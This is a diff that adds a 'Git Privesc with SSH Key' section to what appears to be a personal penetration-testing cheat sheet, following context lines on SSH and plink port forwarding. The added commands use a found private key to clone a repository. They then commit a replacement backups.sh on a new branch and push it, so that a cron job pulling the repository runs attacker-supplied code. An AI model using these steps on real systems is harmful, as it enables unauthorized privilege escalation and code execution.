@@ -174,3 +174,17 @@ ssh -D <local proxy port> -p <remote port> <target>
 ```bash
 plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
 ```
+
+#### Git Privesc with SSH Key
+
+Was in /git-server directory, ssh found in /home/git/.ssh, cronjobs were pulling
+```bash
+GIT_SSH_COMMAND='ssh -i ~/.ssh/id_rsa -p 43022' git clone git@192.168.213.125:/git-server
+cd git-server/
+cp ../backups.sh .
+git branch fuckyes
+git checkout fuckyes
+git add -A
+git commit -m 'FUKC YUESESESEES'
+GIT_SSH_COMMAND='ssh -i ~/.ssh/id_rsa -p 43022' git push origin fuckyes
+```
